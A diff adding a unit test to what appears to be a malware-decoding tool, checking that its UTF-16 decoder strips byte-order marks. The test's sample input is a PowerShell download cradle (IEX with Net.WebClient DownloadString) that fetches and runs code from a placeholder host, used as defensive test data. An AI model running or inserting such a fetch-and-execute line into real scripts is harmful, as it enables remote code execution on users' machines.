@@ -179,3 +179,19 @@ def test_gzip_stream_with_percent_bytes_not_hijacked():
     eng = TitanEngine(Config())
     rep = eng.run_analysis(base64.b64encode(blob))
     assert any("stress.example" in u for u in rep["iocs"]["urls"]), rep["iocs"]
+
+
+def test_utf16_decoder_strips_bom():
+    # Explicit-endian codecs don't consume a leading BOM: it decoded to U+FEFF
+    # and re-encoded as \xef\xbb\xbf at the front of the UTF-8 output,
+    # corrupting the artifact and its hash. PowerShell routinely emits
+    # BOM-prefixed UTF-16, so both endians must round-trip cleanly.
+    from titan_decoder.decoders.base import Utf16Decoder
+
+    text = "IEX (New-Object Net.WebClient).DownloadString('http://b.example/x')"
+    for encoding, bom in (("utf-16-le", b"\xff\xfe"), ("utf-16-be", b"\xfe\xff")):
+        for prefix in (b"", bom):
+            data = prefix + text.encode(encoding)
+            out, ok = Utf16Decoder().decode(data)
+            assert ok, (encoding, bool(prefix))
+            assert out == text.encode("utf-8"), (encoding, bool(prefix), out[:8])
